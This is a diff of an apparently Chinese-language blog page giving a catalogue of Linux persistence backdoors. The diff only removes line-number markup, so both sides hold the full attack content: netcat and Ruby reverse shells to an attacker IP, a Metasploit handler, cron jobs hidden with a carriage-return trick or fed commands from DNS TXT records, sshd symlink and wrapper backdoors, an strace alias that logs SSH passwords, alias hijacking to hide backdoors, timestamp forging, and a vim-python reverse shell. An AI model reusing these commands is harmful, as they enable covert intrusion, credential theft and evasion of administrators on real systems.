@@ -252,7 +252,7 @@
 
 <span id="more"></span>
 <hr>
-<h2 id="0x01-Metasploit"><a href="#0x01-Metasploit" class="headerlink" title="0x01 Metasploit"></a>0x01 Metasploit</h2><h3 id="1-Unix-中反弹shell的paylaod"><a href="#1-Unix-中反弹shell的paylaod" class="headerlink" title="1. Unix 中反弹shell的paylaod"></a>1. Unix 中反弹shell的paylaod</h3><pre class="line-numbers language-none"><code class="language-none">msfvenom -l payloads | grep &#39;cmd&#x2F;unix&#x2F;reverse&#39;
+<h2 id="0x01-Metasploit"><a href="#0x01-Metasploit" class="headerlink" title="0x01 Metasploit"></a>0x01 Metasploit</h2><h3 id="1-Unix-中反弹shell的paylaod"><a href="#1-Unix-中反弹shell的paylaod" class="headerlink" title="1. Unix 中反弹shell的paylaod"></a>1. Unix 中反弹shell的paylaod</h3><pre class="language-none"><code class="language-none">msfvenom -l payloads | grep &#39;cmd&#x2F;unix&#x2F;reverse&#39;
 
     cmd&#x2F;unix&#x2F;reverse                                    Creates an interactive shell through two inbound connections
     cmd&#x2F;unix&#x2F;reverse_awk                                Creates an interactive shell via GNU AWK
@@ -280,16 +280,16 @@
     cmd&#x2F;unix&#x2F;reverse_ssl_double_telnet                  Creates an interactive shell through two inbound connections, encrypts using SSL via &quot;-z&quot; option
     cmd&#x2F;unix&#x2F;reverse_stub                               Creates an interactive shell through an inbound connection (stub only, no payload)
     cmd&#x2F;unix&#x2F;reverse_tclsh                              Creates an interactive shell via Tclsh
-    cmd&#x2F;unix&#x2F;reverse_zsh                                Connect back and create a command shell via Zsh. Note: Although Zsh is often available, please be aware it isn&#39;t usually installed by default<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+    cmd&#x2F;unix&#x2F;reverse_zsh                                Connect back and create a command shell via Zsh. Note: Although Zsh is often available, please be aware it isn&#39;t usually installed by default</code></pre>
 
-<h3 id="2-msfvenom-生成payload"><a href="#2-msfvenom-生成payload" class="headerlink" title="2. msfvenom 生成payload"></a>2. msfvenom 生成payload</h3><pre class="line-numbers language-none"><code class="language-none">msfvenom -p &lt;payload&gt; LHOST&#x3D;&lt;LHOST&gt; LPORT&#x3D;&lt;LPORT&gt; -f &lt;format&gt; -o &lt;path&gt;
+<h3 id="2-msfvenom-生成payload"><a href="#2-msfvenom-生成payload" class="headerlink" title="2. msfvenom 生成payload"></a>2. msfvenom 生成payload</h3><pre class="language-none"><code class="language-none">msfvenom -p &lt;payload&gt; LHOST&#x3D;&lt;LHOST&gt; LPORT&#x3D;&lt;LPORT&gt; -f &lt;format&gt; -o &lt;path&gt;
 
-msfvenom -p &lt;payload&gt; -e &lt;encoder &gt; -i &lt;encoder times&gt; LHOST&#x3D;&lt;LHOST&gt; LPORT&#x3D;&lt;LPORT&gt; -f &lt;format&gt; -o &lt;path&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+msfvenom -p &lt;payload&gt; -e &lt;encoder &gt; -i &lt;encoder times&gt; LHOST&#x3D;&lt;LHOST&gt; LPORT&#x3D;&lt;LPORT&gt; -f &lt;format&gt; -o &lt;path&gt;</code></pre>
 
 <p>refer: <a target="_blank" rel="noopener" href="https://gitee.com/l0n9/sec-notes/blob/master/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/Metsploit%E5%9F%BA%E7%A1%80%E7%AF%87.md">https://gitee.com/l0n9/sec-notes/blob/master/Metsploit</a></p>
 <h3 id="3-meterpreter-shell"><a href="#3-meterpreter-shell" class="headerlink" title="3. meterpreter shell"></a>3. meterpreter shell</h3><p>shell升级为 meterpreter shell</p>
 <p>攻击机配置msf 监听：</p>
-<pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;multi&#x2F;handler
+<pre class="language-none"><code class="language-none">use exploit&#x2F;multi&#x2F;handler
 
 set payload linux&#x2F;x86&#x2F;shell&#x2F;reverse_tcp
 
@@ -297,19 +297,19 @@ set lport 6666
 
 set lhost 192.168.1.1
 
-run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+run</code></pre>
 
 <p>目标主机上反弹shell</p>
-<pre class="line-numbers language-none"><code class="language-none">rm -f &#x2F;tmp&#x2F;f; mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f | &#x2F;bin&#x2F;sh -i 2&gt;&amp;1 | nc 192.168.1.1 6666 &gt; &#x2F;tmp&#x2F;f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="language-none"><code class="language-none">rm -f &#x2F;tmp&#x2F;f; mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f | &#x2F;bin&#x2F;sh -i 2&gt;&amp;1 | nc 192.168.1.1 6666 &gt; &#x2F;tmp&#x2F;f</code></pre>
 
 <p>获取一个普通shell, 在这个shell中输入 background, 在对话中选择 y, 将shell放在了后台</p>
 <p>使用 sessions -u 1 将普通shell提升为 meterpreter shell</p>
 <p>sessions命令查看shell会话，sessions -i id 切换到目标shell</p>
-<h2 id="0x02-计划任务后门"><a href="#0x02-计划任务后门" class="headerlink" title="0x02 计划任务后门"></a>0x02 计划任务后门</h2><h3 id="1-查找计划任务相关文件"><a href="#1-查找计划任务相关文件" class="headerlink" title="1. 查找计划任务相关文件"></a>1. 查找计划任务相关文件</h3><pre class="line-numbers language-none"><code class="language-none">1) sudo find &#x2F; -name &#39;cron*&#39; | egrep -v &#39;man|doc&#39; | sort -u
+<h2 id="0x02-计划任务后门"><a href="#0x02-计划任务后门" class="headerlink" title="0x02 计划任务后门"></a>0x02 计划任务后门</h2><h3 id="1-查找计划任务相关文件"><a href="#1-查找计划任务相关文件" class="headerlink" title="1. 查找计划任务相关文件"></a>1. 查找计划任务相关文件</h3><pre class="language-none"><code class="language-none">1) sudo find &#x2F; -name &#39;cron*&#39; | egrep -v &#39;man|doc&#39; | sort -u
 
-2) sudo updatedb &amp;&amp; sudo locate cron | egrep -v &#39;doc|man&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+2) sudo updatedb &amp;&amp; sudo locate cron | egrep -v &#39;doc|man&#39;</code></pre>
 
-<h3 id="2-定时任务文件说明"><a href="#2-定时任务文件说明" class="headerlink" title="2. 定时任务文件说明"></a>2. 定时任务文件说明</h3><pre class="line-numbers language-none"><code class="language-none">1) 用户允许&#x2F;禁止配置文件
+<h3 id="2-定时任务文件说明"><a href="#2-定时任务文件说明" class="headerlink" title="2. 定时任务文件说明"></a>2. 定时任务文件说明</h3><pre class="language-none"><code class="language-none">1) 用户允许&#x2F;禁止配置文件
 
 - &#x2F;etc&#x2F;cron.deny ：用来禁止一些用户使用cron服务的配置文件
 
@@ -331,33 +331,33 @@ run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span>
     &#x2F;etc&#x2F;cron.deny
     &#x2F;etc&#x2F;cron.hourly
     &#x2F;etc&#x2F;cron.monthly
-    &#x2F;etc&#x2F;cron.weekly<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+    &#x2F;etc&#x2F;cron.weekly</code></pre>
 
 <p>定时任务在线生成器：<a target="_blank" rel="noopener" href="https://crontab.guru/">https://crontab.guru/</a></p>
 <h3 id="3-计划任务隐藏后门"><a href="#3-计划任务隐藏后门" class="headerlink" title="3. 计划任务隐藏后门"></a>3. 计划任务隐藏后门</h3><p>隐藏思路</p>
-<pre class="line-numbers language-none"><code class="language-none">1) 不使用用户cron配置项：避免crontab命令查看计划任务内容
+<pre class="language-none"><code class="language-none">1) 不使用用户cron配置项：避免crontab命令查看计划任务内容
 
 2) 不使用常用目录及文件如：&#x2F;var&#x2F;spool&#x2F;cron、&#x2F;etc&#x2F;crontab等
 
 3) 劫持&#x2F;修改系统默认的计划任务文件：伪装文件名&#x2F;文件位置
 
-如：&#x2F;etc&#x2F;cron.daily 、&#x2F;etc&#x2F;cron.hourly目录下自带文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+如：&#x2F;etc&#x2F;cron.daily 、&#x2F;etc&#x2F;cron.hourly目录下自带文件</code></pre>
 
 <p>隐藏技巧</p>
-<pre class="line-numbers language-none"><code class="language-none">1) 巧妙利用windows中的 \r（ Linux 中显示为M), 导致显示截断，从而隐藏真实的计划任务，使用crontab -e 可以看到
+<pre class="language-none"><code class="language-none">1) 巧妙利用windows中的 \r（ Linux 中显示为M), 导致显示截断，从而隐藏真实的计划任务，使用crontab -e 可以看到
 
 (crontab -l;printf &quot;*&#x2F;1 * * * * &#x2F;root&#x2F;.devops.sh;\rno crontab for &#96;whoami&#96;%100c\n&quot;)|crontab -
 
 2) 使用DNS的TXT记录，通过解析这个记录来进行执行，使用linux.org等公共域名进行隐藏
 
-0 1 * * * &#x2F;bin&#x2F;sh -c &quot;sh -c $(dig logging.chat TXT +short @pola.ns.cloudflare.com)&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+0 1 * * * &#x2F;bin&#x2F;sh -c &quot;sh -c $(dig logging.chat TXT +short @pola.ns.cloudflare.com)&quot;</code></pre>
 
 <p>refer：<a target="_blank" rel="noopener" href="https://blog.sucuri.net/2019/05/cronjob-backdoors.html">https://blog.sucuri.net/2019/05/cronjob-backdoors.html</a></p>
-<h2 id="0x03-SSH系列后门"><a href="#0x03-SSH系列后门" class="headerlink" title="0x03 SSH系列后门"></a>0x03 SSH系列后门</h2><h3 id="1-软链接后门"><a href="#1-软链接后门" class="headerlink" title="1. 软链接后门"></a>1. 软链接后门</h3><pre class="line-numbers language-none"><code class="language-none">ln -sf &#x2F;usr&#x2F;sbin&#x2F;sshd &#x2F;tmp&#x2F;su; &#x2F;tmp&#x2F;su -oPort&#x3D;6666;
+<h2 id="0x03-SSH系列后门"><a href="#0x03-SSH系列后门" class="headerlink" title="0x03 SSH系列后门"></a>0x03 SSH系列后门</h2><h3 id="1-软链接后门"><a href="#1-软链接后门" class="headerlink" title="1. 软链接后门"></a>1. 软链接后门</h3><pre class="language-none"><code class="language-none">ln -sf &#x2F;usr&#x2F;sbin&#x2F;sshd &#x2F;tmp&#x2F;su; &#x2F;tmp&#x2F;su -oPort&#x3D;6666;
 
-ssh root@x.x.x.x -p 6666<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+ssh root@x.x.x.x -p 6666</code></pre>
 
-<h3 id="2-SSH-Wapper-后门"><a href="#2-SSH-Wapper-后门" class="headerlink" title="2. SSH Wapper 后门"></a>2. SSH Wapper 后门</h3><pre class="line-numbers language-none"><code class="language-none">cd &#x2F;usr&#x2F;sbin&#x2F;
+<h3 id="2-SSH-Wapper-后门"><a href="#2-SSH-Wapper-后门" class="headerlink" title="2. SSH Wapper 后门"></a>2. SSH Wapper 后门</h3><pre class="language-none"><code class="language-none">cd &#x2F;usr&#x2F;sbin&#x2F;
 mv sshd ..&#x2F;bin
 vim sshd &#x2F;&#x2F;编辑sshd内容为以下
 
@@ -374,19 +374,19 @@ socat STDIO TCP4:127.0.0.1:22,sourceport&#x3D;22222
 修改源端口
 import struct
 buffer &#x3D; struct.pack(&#39;&gt;I&#39;,22222)
-print(buffer)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+print(buffer)</code></pre>
 
 <h3 id="3-SSH公钥后门"><a href="#3-SSH公钥后门" class="headerlink" title="3. SSH公钥后门"></a>3. SSH公钥后门</h3><p>攻击机中使用 ssh-keygen -t rsa 生成公私钥</p>
 <p>将公钥 id_rsa.pub 上传到目标主机，保存为 ~&#x2F;.ssh&#x2F;authorized_keys</p>
-<pre class="line-numbers language-none"><code class="language-none">ssh user@host<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="language-none"><code class="language-none">ssh user@host</code></pre>
 
-<h3 id="4-SSH-Keylogger"><a href="#4-SSH-Keylogger" class="headerlink" title="4. SSH Keylogger"></a>4. SSH Keylogger</h3><pre class="line-numbers language-none"><code class="language-none"># 利用strace工具获取ssh的读写连接的数据，以达到抓取管理员登陆其他机器的明文密码
+<h3 id="4-SSH-Keylogger"><a href="#4-SSH-Keylogger" class="headerlink" title="4. SSH Keylogger"></a>4. SSH Keylogger</h3><pre class="language-none"><code class="language-none"># 利用strace工具获取ssh的读写连接的数据，以达到抓取管理员登陆其他机器的明文密码
 alias ssh&#x3D;&#39;strace -o &#x2F;tmp&#x2F;.sshpwd-&#96;date &#39;+%d%h%m%s&#39;&#96;.log -e read.write.connect -s 2048 ssh&#39;
 
-grep &quot;read(5&quot; &#x2F;tmp&#x2F;.sshpwdxxxxxxxx.log<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+grep &quot;read(5&quot; &#x2F;tmp&#x2F;.sshpwdxxxxxxxx.log</code></pre>
 
 <h2 id="0x04-alias后门"><a href="#0x04-alias后门" class="headerlink" title="0x04 alias后门"></a>0x04 alias后门</h2><h3 id="1-后门存放位置"><a href="#1-后门存放位置" class="headerlink" title="1. 后门存放位置"></a>1. 后门存放位置</h3><p>系统启动默认加载的配置文件</p>
-<pre class="line-numbers language-none"><code class="language-none">1) &#x2F;etc&#x2F;profile
+<pre class="language-none"><code class="language-none">1) &#x2F;etc&#x2F;profile
 
 【系统级】Linux是一个多用户操作系统。用户登录或切换（即Login shell 启动）时都有一个专用的运行环境，但首先执行 &#x2F;etc&#x2F;profile
 
@@ -408,13 +408,13 @@ grep &quot;read(5&quot; &#x2F;tmp&#x2F;.sshpwdxxxxxxxx.log<span aria-hidden="tru
 
 5) ~&#x2F;.bash_logout
 
-【用户级】当每次退出系统(退出bash shell)时执行该文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+【用户级】当每次退出系统(退出bash shell)时执行该文件</code></pre>
 
 <h3 id="2-后门制作"><a href="#2-后门制作" class="headerlink" title="2. 后门制作"></a>2. 后门制作</h3><p>当前用户目录下.bashrc</p>
-<pre class="line-numbers language-none"><code class="language-none">alias ssh&#x3D;&#39;strace -o &#x2F;tmp&#x2F;sshpwd-&#96;date &#39;+%d%h%m%s&#39;&#96;.log -e read,write,connect -s 2048 ssh&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="language-none"><code class="language-none">alias ssh&#x3D;&#39;strace -o &#x2F;tmp&#x2F;sshpwd-&#96;date &#39;+%d%h%m%s&#39;&#96;.log -e read,write,connect -s 2048 ssh&#39;</code></pre>
 
 <p>创建alias后门</p>
-<pre class="line-numbers language-none"><code class="language-none">1) 受控端创建别名
+<pre class="language-none"><code class="language-none">1) 受控端创建别名
 
 alias ls&#x3D;&quot;alerts()&#123; ls $* --color&#x3D;auto;ruby -rsocket -e &#39;exit if fork;c&#x3D;TCPSocket.new(&quot;&#39;&quot;&#39;&quot;192.168.1.1&quot;&#39;&quot;&#39;&quot;,&quot;&#39;&quot;&#39;&quot;6666&quot;&#39;&quot;&#39;&quot;);while(cmd&#x3D;c.gets);IO.popen(cmd,&quot;&#39;&quot;&#39;&quot;r&quot;&#39;&quot;&#39;&quot;)&#123;|io|c.print io.read&#125;end&#39;;&#125;;alerts&quot;
 
@@ -422,21 +422,21 @@ alias ls&#x3D;&quot;alerts()&#123; ls $* --color&#x3D;auto;ruby -rsocket -e &#39
 
 nc -lvnp 6666
 
-3) 受控端执行别名命令，攻击端获得反弹shell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+3) 受控端执行别名命令，攻击端获得反弹shell</code></pre>
 
 <h3 id="3-后门隐藏"><a href="#3-后门隐藏" class="headerlink" title="3. 后门隐藏"></a>3. 后门隐藏</h3><p>alias命令可以查看当前的别名，会让别名后门暴露。因此需要劫持alias命令，使输出中不显示后门指令。</p>
 <p>另外unalias命令会清除别名，也需要对其进行劫持，避免后门指令的别名被清除。</p>
 <p><strong>1）创建unalias别名</strong></p>
-<pre class="line-numbers language-none"><code class="language-none">alias unalias&#x3D;&#39;alerts()&#123; if [ $# !&#x3D; 0 ]; then if [ $* !&#x3D; &quot;ls&quot; ]&amp;&amp;[ $* !&#x3D; &quot;alias&quot; ]&amp;&amp;[ $* !&#x3D; &quot;unalias&quot; ]; then unalias $*;else echo &quot;-bash: unalias: $&#123;*&#125;: not found&quot;;fi;else echo &quot;unalias: usage: unalias [-a] name [name ...]&quot;;fi;&#125;;alerts&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="language-none"><code class="language-none">alias unalias&#x3D;&#39;alerts()&#123; if [ $# !&#x3D; 0 ]; then if [ $* !&#x3D; &quot;ls&quot; ]&amp;&amp;[ $* !&#x3D; &quot;alias&quot; ]&amp;&amp;[ $* !&#x3D; &quot;unalias&quot; ]; then unalias $*;else echo &quot;-bash: unalias: $&#123;*&#125;: not found&quot;;fi;else echo &quot;unalias: usage: unalias [-a] name [name ...]&quot;;fi;&#125;;alerts&#39;</code></pre>
 
 <p><strong>2) 创建alias的别名</strong></p>
-<pre class="line-numbers language-none"><code class="language-none">劫持前先将当前alias结果保存至比较隐蔽的文件
+<pre class="language-none"><code class="language-none">劫持前先将当前alias结果保存至比较隐蔽的文件
 alias &gt; &#x2F;etc&#x2F;gnupg&#x2F;.gnupg
 
-alias alias&#x3D;&quot;cat &#x2F;etc&#x2F;gnupg&#x2F;.gnupg&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+alias alias&#x3D;&quot;cat &#x2F;etc&#x2F;gnupg&#x2F;.gnupg&quot;</code></pre>
 
 <p><strong>3) 文件位置隐蔽</strong></p>
-<pre class="line-numbers language-none"><code class="language-none">1) 在正常的位置创建合理的文件
+<pre class="language-none"><code class="language-none">1) 在正常的位置创建合理的文件
 vi &#x2F;etc&#x2F;yum&#x2F;yum-update.rc  &#x2F;&#x2F;创建文件，加入别名设置
 
 alias ls&#x3D;&quot;alerts()&#123; ls $* --color&#x3D;auto;ruby -rsocket -e &#39;exit if fork;c&#x3D;TCPSocket.new(&quot;&#39;&quot;&#39;&quot;192.168.1.1&quot;&#39;&quot;&#39;&quot;,&quot;&#39;&quot;&#39;&quot;6666&quot;&#39;&quot;&#39;&quot;);while(cmd&#x3D;c.gets);IO.popen(cmd,&quot;&#39;&quot;&#39;&quot;r&quot;&#39;&quot;&#39;&quot;)&#123;|io|c.print io.read&#125;end&#39;;&#125;;alerts&quot;
@@ -447,9 +447,9 @@ alias alias&#x3D;&quot;cat &#x2F;etc&#x2F;gnupg&#x2F;.gnupg&quot;
 
 2) 将正常文件的时间复制给包含alias的文件
 
-touch -acmr version-groups.conf yum-update.rc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+touch -acmr version-groups.conf yum-update.rc</code></pre>
 
-<h2 id="0x05-vim后门"><a href="#0x05-vim后门" class="headerlink" title="0x05 vim后门"></a>0x05 vim后门</h2><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; 适用于安装了vim且安装了python扩展(绝大版本默认安装)的linux系统,恶意脚本.py的内容可以是任何功能的后门
+<h2 id="0x05-vim后门"><a href="#0x05-vim后门" class="headerlink" title="0x05 vim后门"></a>0x05 vim后门</h2><pre class="language-none"><code class="language-none">&#x2F;&#x2F; 适用于安装了vim且安装了python扩展(绝大版本默认安装)的linux系统,恶意脚本.py的内容可以是任何功能的后门
 
 cd &#x2F;usr&#x2F;lib&#x2F;python2.7&#x2F;site-packages &amp;&amp; $(nohup vim -E -c &quot;pyfile json.py&quot;&gt; &#x2F;dev&#x2F;null 2&gt;&amp;1 &amp;) &amp;&amp; sleep 2 &amp;&amp; rm -f json.py
 
@@ -465,9 +465,9 @@ p &#x3D; subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;, &quot;-i&quot;]);
 
 &#x2F;&#x2F;  攻击机监听6666端口并获取反弹的shell
 
-nc -lvnp 6666<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+nc -lvnp 6666</code></pre>
 
-<h2 id="0x06-LD-PRELOAD-后门"><a href="#0x06-LD-PRELOAD-后门" class="headerlink" title="0x06 LD_PRELOAD 后门"></a>0x06 LD_PRELOAD 后门</h2><h3 id="环境变量隐藏"><a href="#环境变量隐藏" class="headerlink" title="环境变量隐藏"></a>环境变量隐藏</h3><pre class="line-numbers language-none"><code class="language-none">1) echo $LD_PRELOAD 
+<h2 id="0x06-LD-PRELOAD-后门"><a href="#0x06-LD-PRELOAD-后门" class="headerlink" title="0x06 LD_PRELOAD 后门"></a>0x06 LD_PRELOAD 后门</h2><h3 id="环境变量隐藏"><a href="#环境变量隐藏" class="headerlink" title="环境变量隐藏"></a>环境变量隐藏</h3><pre class="language-none"><code class="language-none">1) echo $LD_PRELOAD 
 
 alias echo&#x3D;&#39;func()&#123; echo $* | sed &quot;s!&#x2F;home&#x2F;hook.so! !g&quot;;&#125;;func&#39;
 
@@ -489,7 +489,7 @@ alias unalias&#x3D;&#39;func()&#123; if [ $# !&#x3D; 0 ]; then if [ $* !&#x3D; &
 
 6) alias劫持
 
-alias alias&#x3D;&#39;func()&#123; alias &quot;$@&quot; | grep -v unalias | grep -v hook.so;&#125;;func&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+alias alias&#x3D;&#39;func()&#123; alias &quot;$@&quot; | grep -v unalias | grep -v hook.so;&#125;;func&#39;</code></pre>
 
 <h3 id="利用工具"><a href="#利用工具" class="headerlink" title="利用工具"></a>利用工具</h3><ul>
 <li><a target="_blank" rel="noopener" href="https://github.com/mempodippy/cub3">https://github.com/mempodippy/cub3</a> </li>
